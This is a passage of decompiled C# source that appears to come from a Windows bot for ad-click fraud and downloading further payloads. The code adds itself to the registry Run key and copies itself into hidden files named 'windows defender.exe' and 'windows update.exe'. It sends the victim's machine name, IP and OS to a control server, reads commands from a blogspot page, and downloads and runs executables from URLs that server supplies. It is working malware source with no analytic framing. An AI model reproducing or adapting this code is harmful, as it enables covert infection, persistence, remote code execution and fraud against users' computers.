				if (num == 5)
				{
					registryKey.SetValue("Version", "Chrome/16.0.912.77", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 6)
				{
					registryKey.SetValue("Version", "Chrome/15.0.874.54", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 7)
				{
					registryKey.SetValue("Version", "Firefox/14.0a1", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 8)
				{
					registryKey.SetValue("Version", "Firefox/15.0a1", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 9)
				{
					registryKey.SetValue("Version", "Firefox/12.0", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 10)
				{
					registryKey.SetValue("Version", "Firefox/11.0", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 11)
				{
					registryKey.SetValue("Version", "Firefox/10.0a4", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 12)
				{
					registryKey.SetValue("Version", "Firefox/9.0.1", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 13)
				{
					registryKey.SetValue("Version", "Opera/9.80", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 14)
				{
					registryKey.SetValue("Version", "Opera/9.64", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 15)
				{
					registryKey.SetValue("Version", "MSIE 10.0", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 16)
				{
					registryKey.SetValue("Version", "MSIE 9.0", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 17)
				{
					registryKey.SetValue("Version", "MSIE 8.0", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 18)
				{
					registryKey.SetValue("Version", "MSIE 7.0", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 19)
				{
					registryKey.SetValue("Version", "AOL 9.5", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
				if (num == 20)
				{
					registryKey.SetValue("Version", "AOL 9.1", RegistryValueKind.String);
					Class5.smethod_0().brw = 1;
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			method_2("Error while changing the User Agent", ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void startwithwin(string Name, string Path)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		RegistryKey registryKey = default(RegistryKey);
		RegistryKey currentUser = default(RegistryKey);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 93:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0010;
						case 4:
							goto IL_0020;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0020:
					num = 4;
					registryKey.SetValue(Name, Path, RegistryValueKind.String);
					break;
					IL_0007:
					num = 2;
					currentUser = Registry.CurrentUser;
					goto IL_0010;
					IL_0010:
					num = 3;
					registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					goto IL_0020;
					end_IL_0000_2:
					break;
				}
				ProjectData.ClearProjectError();
				num3 = 0;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 93;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_5()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (Operators.CompareString(process.ProcessName, "windows defender", false) == 0)
				{
					return;
				}
			}
			if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(string_1 + "\\rstr.pr.tt.rr.b"))
			{
				return;
			}
			if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(string_1 + "\\windows defender.exe"))
			{
				try
				{
					Process.Start(string_1 + "\\windows defender.exe");
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(string_1 + "\\windows defender.exe");
					method_8();
					ProjectData.ClearProjectError();
					return;
				}
			}
			method_8();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void method_6()
	{
		try
		{
			if (Operators.CompareString(string_27, string.Empty, false) == 0)
			{
				vmethod_40().Start();
			}
			else if ((double)Class5.smethod_0().addslvs != Conversions.ToDouble(vmethod_2().get_Text()))
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_12 + "control.html");
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				string text;
				try
				{
					text = ((ServerComputer)Class1.smethod_0()).get_Info().get_OSFullName();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					text = "Unknown";
					ProjectData.ClearProjectError();
				}
				string value = ((ServerComputer)Class1.smethod_0()).get_Name().ToString() + "(ID: " + Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Info().get_TotalPhysicalMemory()) + Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Info().get_TotalVirtualMemory()) + " | IP: " + string_27 + " | " + text + " | v8." + vmethod_2().get_Text();
				string text2 = streamReader.ReadToEnd();
				HttpWebRequest httpWebRequest2 = (HttpWebRequest)WebRequest.Create("http://api.wipmania.com/" + string_27);
				HttpWebResponse httpWebResponse2 = (HttpWebResponse)httpWebRequest2.GetResponse();
				StreamReader streamReader2 = new StreamReader(httpWebResponse2.GetResponseStream());
				string text3 = streamReader2.ReadToEnd();
				string text4 = text3;
				if ((Operators.CompareString(text4, "xx", false) == 0) | (Operators.CompareString(text4, string.Empty, false) == 0) | (text4.Length > 4))
				{
					text4 = "??";
				}
				if (!text2.Contains(value))
				{
					vmethod_26().Navigate(string_12 + "post.php?w=<b>" + ((ServerComputer)Class1.smethod_0()).get_Name().ToString() + "(ID: " + Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Info().get_TotalPhysicalMemory()) + Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Info().get_TotalVirtualMemory()) + " | IP: " + string_27 + " | " + text + " | v8." + vmethod_2().get_Text() + " | " + text4 + ")</b>%20<br />%20");
					Class5.smethod_0().addslvs = Conversions.ToInteger(vmethod_2().get_Text());
					((ApplicationSettingsBase)Class5.smethod_0()).Save();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			vmethod_40().Start();
			ProjectData.ClearProjectError();
		}
	}

	private void method_7()
	{
		try
		{
			((ServerComputer)Class1.smethod_0()).get_FileSystem().CopyFile(Process.GetCurrentProcess().MainModule!.FileName, string_0 + "\\windows update.exe");
			if (File.GetAttributes(string_0 + "\\windows update.exe") == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0 + "\\windows update.exe", (FileAttributes)0);
				Process.Start(string_0 + "\\windows update.exe");
				File.SetAttributes(string_0 + "\\windows update.exe", FileAttributes.Hidden);
			}
			else
			{
				Process.Start(string_0 + "\\windows update.exe");
				File.SetAttributes(string_0 + "\\windows update.exe", FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			method_2("Error while copying to docs", ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	private void method_8()
	{
		try
		{
			((ServerComputer)Class1.smethod_0()).get_FileSystem().CopyFile(Process.GetCurrentProcess().MainModule!.FileName, string_1 + "\\windows defender.exe");
			if (File.GetAttributes(string_1 + "\\windows defender.exe") == FileAttributes.Hidden)
			{
				File.SetAttributes(string_1 + "\\windows defender.exe", (FileAttributes)0);
				Process.Start(string_1 + "\\windows defender.exe");
				File.SetAttributes(string_1 + "\\windows defender.exe", FileAttributes.Hidden);
			}
			else
			{
				Process.Start(string_1 + "\\windows defender.exe");
				File.SetAttributes(string_1 + "\\windows defender.exe", FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			method_2("Error while copying to temp", ex2.ToString());
			vmethod_32().Start();
			ProjectData.ClearProjectError();
		}
	}

	private void method_9()
	{
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		if (vmethod_0().get_Url().ToString().Contains("clicksmadebykasfandman"))
		{
			try
			{
				HtmlElementCollection elementsByTagName = vmethod_0().get_Document().GetElementsByTagName("b");
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = elementsByTagName.GetEnumerator();
					while (enumerator.MoveNext())
					{
						HtmlElement val = (HtmlElement)enumerator.Current;
						try
						{
							if (Operators.CompareString(val.get_InnerText(), "ud", false) == 0)
							{
								string_28 = val.GetAttribute("v");
								string_29 = val.GetAttribute("uder");
							}
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							method_2("Error while getting update command info", ex2.ToString());
							vmethod_32().Start();
							ProjectData.ClearProjectError();
						}
						try
						{
							if (Operators.CompareString(val.get_InnerText(), "dr", false) == 0)
							{
								string_35 = val.GetAttribute("lk");
							}
						}
						catch (Exception ex3)
						{
							ProjectData.SetProjectError(ex3);
							Exception ex4 = ex3;
							method_2("Error while getting Download and Run command info", ex4.ToString());
							ProjectData.ClearProjectError();
						}
						try
						{
							if (Operators.CompareString(val.get_InnerText(), "br", false) == 0)
							{
								string_23 = val.GetAttribute("dc");
								string_24 = val.GetAttribute("tg");
								string_7 = val.GetAttribute("brs");
								if (Conversions.ToDouble(string_7) == 1.0 && Operators.CompareString(string_3, val.GetAttribute("lk"), false) != 0)
								{
									string_3 = val.GetAttribute("lk");
									string_30 = val.GetAttribute("rf");
									string_7 = val.GetAttribute("brs");
									if (Operators.CompareString(string_30, "on", false) == 0)
									{
										string_8 = string_3;
										vmethod_4().Navigate(string_8);
										vmethod_12().Start();
									}
									else
									{
										if ((Operators.CompareString(string_24, string.Empty, false) != 0) & (Operators.CompareString(string_23, string.Empty, false) == 0))
										{
											int_13 = 1;
											vmethod_4().Navigate(string_3);
										}
										else
										{
											vmethod_4().Navigate(string_3);
										}
										vmethod_12().Stop();
									}
								}
								if (Conversions.ToDouble(string_7) == 2.0 && Operators.CompareString(string_4, val.GetAttribute("lk"), false) != 0)
								{
									string_4 = val.GetAttribute("lk");
									string_30 = val.GetAttribute("rf");
									string_7 = val.GetAttribute("brs");
									if (Operators.CompareString(string_30, "on", false) == 0)
									{
										string_9 = string_4;
										vmethod_6().Navigate(string_9);
										vmethod_14().Start();
									}
									else
									{
										if ((Operators.CompareString(string_24, string.Empty, false) != 0) & (Operators.CompareString(string_23, string.Empty, false) == 0))
										{
											int_13 = 2;
											vmethod_6().Navigate(string_3);
										}
										else
										{
											vmethod_6().Navigate(string_3);
										}
										vmethod_14().Stop();
									}
								}
								if (Conversions.ToDouble(string_7) == 3.0 && Operators.CompareString(string_5, val.GetAttribute("lk"), false) != 0)
								{
									string_5 = val.GetAttribute("lk");
									string_30 = val.GetAttribute("rf");
									string_7 = val.GetAttribute("brs");
									if (Operators.CompareString(string_30, "on", false) == 0)
									{
										string_10 = string_5;
										vmethod_8().Navigate(string_10);
										vmethod_16().Start();
									}
									else
									{
										if ((Operators.CompareString(string_24, string.Empty, false) != 0) & (Operators.CompareString(string_23, string.Empty, false) == 0))
										{
											int_13 = 3;
											vmethod_8().Navigate(string_3);
										}
										else
										{
											vmethod_8().Navigate(string_3);
										}
										vmethod_16().Stop();
									}
								}
								if (Conversions.ToDouble(string_7) == 4.0 && Operators.CompareString(string_6, val.GetAttribute("lk"), false) != 0)
								{
									string_6 = val.GetAttribute("lk");
									string_30 = val.GetAttribute("rf");
									string_7 = val.GetAttribute("brs");
									if (Operators.CompareString(string_30, "on", false) == 0)
									{
										string_11 = string_6;
										vmethod_10().Navigate(string_11);
										vmethod_18().Start();
									}
									else
									{
										if ((Operators.CompareString(string_24, string.Empty, false) != 0) & (Operators.CompareString(string_23, string.Empty, false) == 0))
										{
											int_13 = 4;
											vmethod_10().Navigate(string_3);
										}
										else
										{
											vmethod_10().Navigate(string_3);
										}
										vmethod_18().Stop();
									}
								}
							}
						}
						catch (Exception ex5)
						{
							ProjectData.SetProjectError(ex5);
							Exception ex6 = ex5;
							method_2("Error while getting browse command info", ex6.ToString());
							vmethod_32().Start();
							ProjectData.ClearProjectError();
						}
						try
						{
							if (Operators.CompareString(val.get_InnerText(), "dTM", false) == 0)
							{
								string_31 = val.GetAttribute("pw");
							}
						}
						catch (Exception ex7)
						{
							ProjectData.SetProjectError(ex7);
							Exception ex8 = ex7;
							method_2("Error while getting K.T.M command info", ex8.ToString());
							vmethod_32().Start();
							ProjectData.ClearProjectError();
						}
						try
						{
							if (Operators.CompareString(val.get_InnerText(), "cad", false) == 0)
							{
								string_14 = val.GetAttribute("x");
								string_15 = val.GetAttribute("y");
								string_32 = val.GetAttribute("brs");
								string_33 = val.GetAttribute("pw");
								string_34 = val.GetAttribute("st");
								string_22 = val.GetAttribute("cns");
								string_25 = val.GetAttribute("clr");
							}
						}
						catch (Exception ex9)
						{
							ProjectData.SetProjectError(ex9);
							Exception ex10 = ex9;
							method_2("Error while getting adclick command info", ex10.ToString());
							vmethod_32().Start();
							ProjectData.ClearProjectError();
						}
						try
						{
							if (Operators.CompareString(val.get_InnerText(), "Ce", false) == 0)
							{
								int_24 = Conversions.ToInteger(val.GetAttribute("sc"));
							}
						}
						catch (Exception ex11)
						{
							ProjectData.SetProjectError(ex11);
							Exception ex12 = ex11;
							vmethod_22().set_Interval(300000);
							method_2("Error while getting check every command info", ex12.ToString());
							ProjectData.ClearProjectError();
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				method_10();
				return;
			}
			catch (Exception ex13)
			{
				ProjectData.SetProjectError(ex13);
				Exception ex14 = ex13;
				method_2("Error while getting commands", ex14.ToString());
				vmethod_32().Start();
				ProjectData.ClearProjectError();
				return;
			}
		}
		vmethod_28().Start();
	}

	private void method_10()
	{
		checked
		{
			try
			{
				try
				{
					if (((Operators.CompareString(string_28, vmethod_2().get_Text(), false) > 0) & (Operators.CompareString(string_28, vmethod_2().get_Text(), false) != 0)) && Operators.CompareString(string_29, string.Empty, false) != 0 && int_25 == 0)
					{
						if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(string_0 + "\\upder.exe"))
						{
							((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(string_0 + "\\upder.exe");
							((ServerComputer)Class1.smethod_0()).get_Network().DownloadFile(string_29, string_0 + "\\upder.exe");
							try
							{
								if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(string_1 + "\\49rfjkf094kf043kf"))
								{
									((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(string_1 + "\\49rfjkf094kf043kf");
								}
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
							Process.Start(string_0 + "\\upder.exe");
							File.SetAttributes(string_0 + "\\upder.exe", FileAttributes.Hidden);
							int_25 = 1;
						}
						else
						{
							((ServerComputer)Class1.smethod_0()).get_Network().DownloadFile(string_29, string_0 + "\\upder.exe");
							try
							{
								if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(string_1 + "\\49rfjkf094kf043kf"))
								{
									((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(string_1 + "\\49rfjkf094kf043kf");
								}
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
							Process.Start(string_0 + "\\upder.exe");
							File.SetAttributes(string_0 + "\\upder.exe", FileAttributes.Hidden);
							int_25 = 1;
						}
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					method_2("Error while doing update command", ex2.ToString());
					ProjectData.ClearProjectError();
				}
				try
				{
					if (Operators.CompareString(string_2, string_35, false) != 0)
					{
						string_2 = string_35;
						if (Operators.CompareString(string_2, string.Empty, false) != 0)
						{
							if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(string_1 + "\\0.exe"))
							{
								((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(string_1 + "\\0.exe");
							}
							((ServerComputer)Class1.smethod_0()).get_Network().DownloadFile(string_2, string_1 + "\\0.exe");
							Process.Start(string_1 + "\\0.exe");
							File.SetAttributes(string_1 + "\\0.exe", FileAttributes.Hidden);
						}
					}
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					method_2("Error while doing DownRun command", ex4.ToString());
					ProjectData.ClearProjectError();
				}
				try
				{
					if (Operators.CompareString(string_31, "on", false) == 0)
					{
						vmethod_20().Start();
					}
					else
					{
						vmethod_20().Stop();
					}
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					method_2("Error while doing K.T.M command", ex6.ToString());
					ProjectData.ClearProjectError();
				}
				try
				{
					if ((Operators.CompareString(string_33, "on", false) == 0) & (Operators.CompareString(string_34, string.Empty, false) != 0) & (Operators.CompareString(string_14, string.Empty, false) != 0) & (Operators.CompareString(string_15, string.Empty, false) != 0) & (Operators.CompareString(string_22, string.Empty, false) != 0) & (Operators.CompareString(string_25, string.Empty, false) != 0))
					{
						try
						{
							if (Operators.CompareString(string_21, string_34, false) != 0)
							{
								string_21 = string_34;
								HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_12 + "control2.html");
								HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
								StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
								vmethod_36().set_Text(streamReader.ReadToEnd());
								int_8 = count(vmethod_36().get_Text(), "-00-");
							}
							else
							{
								int_8 = 21;
							}
						}
						catch (Exception ex7)
						{
							ProjectData.SetProjectError(ex7);
							Exception ex8 = ex7;
							int_8 = 21;
							method_2("Error while counting clicks", ex8.ToString());
							ProjectData.ClearProjectError();
						}
						if (int_8 <= 20)
						{
							method_11(Conversions.ToInteger(string_32), string_34);
						}
					}
				}
				catch (Exception ex9)
				{
					ProjectData.SetProjectError(ex9);
					Exception ex10 = ex9;
					method_2("Error while doing AdClickeR command", ex10.ToString());
					ProjectData.ClearProjectError();
				}
				try
				{
					int_24 *= 1000;
					vmethod_22().set_Interval(int_24);
				}
				catch (Exception ex11)
				{
					ProjectData.SetProjectError(ex11);
					Exception ex12 = ex11;
					method_2("Error while doing check every command", ex12.ToString());
					ProjectData.ClearProjectError();
				}
				vmethod_22().Start();
			}
			catch (Exception ex13)
			{
				ProjectData.SetProjectError(ex13);
				Exception ex14 = ex13;
				method_2("Error while doing commands", ex14.ToString());
				vmethod_32().Start();
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_11(int int_26, string string_36)
	{
		if (Operators.CompareString(string_27, string.Empty, false) == 0)
		{
			webBrowser_6.Navigate("http://clicksmadebykasfandman.blogspot.gr/");
			vmethod_38().Start();
			vmethod_22().Start();
			string_21 = string.Empty;
			return;
		}
		method_4();
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://api.wipmania.com/" + string_27);
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
		string text = streamReader.ReadToEnd();
		if (!string_22.Contains(text + ","))
		{
			return;
		}
		if (int_26 == 1)
		{
			if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\57h4wjdhsuw4920eodkcmw938t6_1"))
			{
				string text2 = ((ServerComputer)Class1.smethod_0()).get_FileSystem().ReadAllText(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\57h4wjdhsuw4920eodkcmw938t6_1");
				if (Operators.CompareString(text2, string.Empty, false) != 0)
				{
					string[] array = text2.Split(new char[1] { '|' });
					if ((Operators.CompareString(string_36, array[0], false) != 0) & (Conversions.ToDouble(array[1]) != (double)DateTime.Today.Day))
					{
						method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
					}
					if (Conversions.ToDouble(array[1]) - 2.0 >= (double)DateTime.Today.Day)
					{
						method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
					}
				}
				else
				{
					method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
				}
			}
			else
			{
				method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
			}
		}
		if (int_26 == 2)
		{
			if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\57h4wjdhsuw4920eodkcmw938t6_2"))
			{
				string text3 = ((ServerComputer)Class1.smethod_0()).get_FileSystem().ReadAllText(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\57h4wjdhsuw4920eodkcmw938t6_2");
				if (Operators.CompareString(text3, string.Empty, false) != 0)
				{
					string[] array2 = text3.Split(new char[1] { '|' });
					if ((Operators.CompareString(string_36, array2[0], false) != 0) & (Conversions.ToDouble(array2[1]) != (double)DateTime.Today.Day))
					{
						method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
					}
					if (Conversions.ToDouble(array2[1]) - 2.0 >= (double)DateTime.Today.Day)
					{
						method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
					}
				}
				else
				{
					method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
				}
			}
			else
			{
				method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
			}
		}
		if (int_26 == 3)
		{
			if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\57h4wjdhsuw4920eodkcmw938t6_3"))
			{
				string text4 = ((ServerComputer)Class1.smethod_0()).get_FileSystem().ReadAllText(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\57h4wjdhsuw4920eodkcmw938t6_3");
				if (Operators.CompareString(text4, string.Empty, false) != 0)
				{
					string[] array3 = text4.Split(new char[1] { '|' });
					if ((Operators.CompareString(string_36, array3[0], false) != 0) & (Conversions.ToDouble(array3[1]) != (double)DateTime.Today.Day))
					{
						method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
					}
					if (Conversions.ToDouble(array3[1]) - 2.0 >= (double)DateTime.Today.Day)
					{
						method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
					}
				}
				else
				{
					method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
				}
			}
			else
			{
				method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
			}
		}
		if (int_26 != 4)
		{
			return;
		}
		if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\57h4wjdhsuw4920eodkcmw938t6_4"))
		{
			string text5 = ((ServerComputer)Class1.smethod_0()).get_FileSystem().ReadAllText(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\57h4wjdhsuw4920eodkcmw938t6_4");
			if (Operators.CompareString(text5, string.Empty, false) != 0)
			{
				string[] array4 = text5.Split(new char[1] { '|' });
				if ((Operators.CompareString(string_36, array4[0], false) != 0) & (Conversions.ToDouble(array4[1]) != (double)DateTime.Today.Day))
				{
					method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
				}
				if (Conversions.ToDouble(array4[1]) - 2.0 >= (double)DateTime.Today.Day)
				{
					method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
				}
			}
			else
			{
				method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
			}
		}
		else
		{
			method_12(string_36, Conversions.ToInteger(string_14), Conversions.ToInteger(string_15), string_22, int_26);
		}
	}

	private void method_12(string string_36, int int_26, int int_27, string string_37, int int_28)
	{
		try
		{
			if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\jc47jc47w9j"))
			{
				((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\jc47jc47w9j");
			}
			((ServerComputer)Class1.smethod_0()).get_FileSystem().WriteAllText(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\jc47jc47w9j", string_36 + "|" + Conversions.ToString(int_26) + "|" + Conversions.ToString(int_27) + "|" + string_37 + "|" + Conversions.ToString(int_28), true);
			if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\wndsupd910.exe"))
			{
				((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\wndsupd910.exe");
			}
			((ServerComputer)Class1.smethod_0()).get_Network().DownloadFile(string_25, ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\wndsupd910.exe");
			Process.Start(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\wndsupd910.exe");
			File.SetAttributes(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\wndsupd910.exe", FileAttributes.Hidden);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			method_2("Error while downloading the AdClickeR", ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	private void method_13(object sender, EventArgs e)
	{
		checked
		{
			int_0++;
			if (int_0 == 300)
			{
				int_0 = 0;
				vmethod_4().Refresh();
				vmethod_4().Refresh();
				vmethod_4().Refresh();
				vmethod_4().Refresh();
				vmethod_4().Refresh();
			}
		}
	}

	private void method_14(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0007;
					case 186:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0007;
							case 3:
								goto IL_0017;
							case 4:
								goto IL_0026;
							case 5:
								goto IL_002f;
							case 6:
								goto IL_003c;
							case 7:
								goto IL_0049;
							case 8:
								goto IL_0056;
							case 9:
								goto IL_0063;
							case 10:
							case 11:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 12:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_0063:
						num = 9;
						vmethod_6().Refresh();
						break;
						IL_0007:
						num = 2;
						int_1++;
						goto IL_0017;
						IL_0017:
						num = 3;
						if (int_1 != 300)
						{
							break;
						}
						goto IL_0026;
						IL_0026:
						num = 4;
						int_1 = 0;
						goto IL_002f;
						IL_002f:
						num = 5;
						vmethod_6().Refresh();
						goto IL_003c;
